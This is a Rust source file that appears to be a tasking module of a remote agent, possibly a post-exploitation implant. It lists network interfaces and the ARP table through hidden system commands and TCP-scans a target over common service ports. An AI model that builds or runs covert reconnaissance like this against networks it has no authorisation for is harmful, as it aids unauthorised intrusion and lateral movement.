/// Network scan: enumerate interfaces, ARP table, port scan.

use super::TaskResult;
use serde_json::json;
use std::net::TcpStream;
use std::time::Duration;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    let mut result = serde_json::Map::new();

    // Network interfaces
    result.insert("interfaces".to_string(), get_interfaces());

    // ARP table
    result.insert("arp".to_string(), get_arp_table());

    // Port scan if target specified
    if let Some(target) = args.get("target").and_then(|v| v.as_str()) {
        let ports: Vec<u16> = args
            .get("ports")
            .and_then(|v| v.as_array())
            .map(|arr| arr.iter().filter_map(|p| p.as_u64().map(|n| n as u16)).collect())
            .unwrap_or_else(|| {
                vec![
                    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1433, 1521,
                    3306, 3389, 5432, 5900, 5985, 8080, 8443, 8888,
                ]
            });

        let timeout_ms = args
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(500);

        result.insert(
            "scan".to_string(),
            port_scan(target, &ports, timeout_ms),
        );
    }

    TaskResult::success(
        task_id,
        serde_json::Value::Object(result).to_string(),
    )
}

fn get_interfaces() -> serde_json::Value {
    #[cfg(target_os = "windows")]
    {
        let output = crate::utils::helpers::hidden_command("ipconfig")
            .args(["/all"])
            .output();

        match output {
            Ok(out) => {
                let text = String::from_utf8_lossy(&out.stdout).to_string();
                json!(text)
            }
            Err(_) => json!("failed to enumerate interfaces"),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let output = crate::utils::helpers::hidden_command("ip")
            .args(["addr", "show"])
            .output()
            .or_else(|_| {
                crate::utils::helpers::hidden_command("ifconfig").output()
            });

        match output {
            Ok(out) => {
                let text = String::from_utf8_lossy(&out.stdout).to_string();
                json!(text)
            }
            Err(_) => json!("failed to enumerate interfaces"),
        }
    }
}

fn get_arp_table() -> serde_json::Value {
    #[cfg(target_os = "windows")]
    {
        let output = crate::utils::helpers::hidden_command("arp")
            .args(["-a"])
            .output();

        match output {
            Ok(out) => {
                let text = String::from_utf8_lossy(&out.stdout);
                let mut entries = Vec::new();
                for line in text.lines() {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 && parts[0].contains('.') {
                        entries.push(json!({
                            "ip": parts[0],
                            "mac": parts[1],
                            "type": parts[2],
                        }));
                    }
                }
                json!(entries)
            }
            Err(_) => json!([]),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Read /proc/net/arp
        match std::fs::read_to_string("/proc/net/arp") {
            Ok(content) => {
                let mut entries = Vec::new();
                for line in content.lines().skip(1) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 4 {
                        entries.push(json!({
                            "ip": parts[0],
                            "hw_type": parts[1],
                            "flags": parts[2],
                            "mac": parts[3],
                            "device": parts.get(5).unwrap_or(&""),
                        }));
                    }
                }
                json!(entries)
            }
            Err(_) => {
                // Fallback to arp command
                let output = crate::utils::helpers::hidden_command("arp")
                    .args(["-a"])
                    .output();
                match output {
                    Ok(out) => json!(String::from_utf8_lossy(&out.stdout).to_string()),
                    Err(_) => json!([]),
                }
            }
        }
    }
}

fn port_scan(target: &str, ports: &[u16], timeout_ms: u64) -> serde_json::Value {
    let timeout = Duration::from_millis(timeout_ms);
    let mut open_ports = Vec::new();

    for &port in ports {
        let addr = format!("{}:{}", target, port);
        if let Ok(addr) = addr.parse() {
            match TcpStream::connect_timeout(&addr, timeout) {
                Ok(_) => {
                    open_ports.push(json!({
                        "port": port,
                        "state": "open",
                        "service": guess_service(port),
                    }));
                }
                Err(_) => {
                    // Port closed or filtered — don't report
                }
            }
        }
    }

    json!(open_ports)
}

fn guess_service(port: u16) -> &'static str {
    match port {
        21 => "ftp",
        22 => "ssh",
        23 => "telnet",
        25 => "smtp",
        53 => "dns",
        80 => "http",
        110 => "pop3",
        135 => "msrpc",
        139 => "netbios",
        143 => "imap",
        443 => "https",
        445 => "smb",
        993 => "imaps",
        995 => "pop3s",
        1433 => "mssql",
        1521 => "oracle",
        3306 => "mysql",
        3389 => "rdp",
        5432 => "postgres",
        5900 => "vnc",
        5985 => "winrm",
        8080 => "http-proxy",
        8443 => "https-alt",
        8888 => "http-alt",
        _ => "unknown",
    }
}
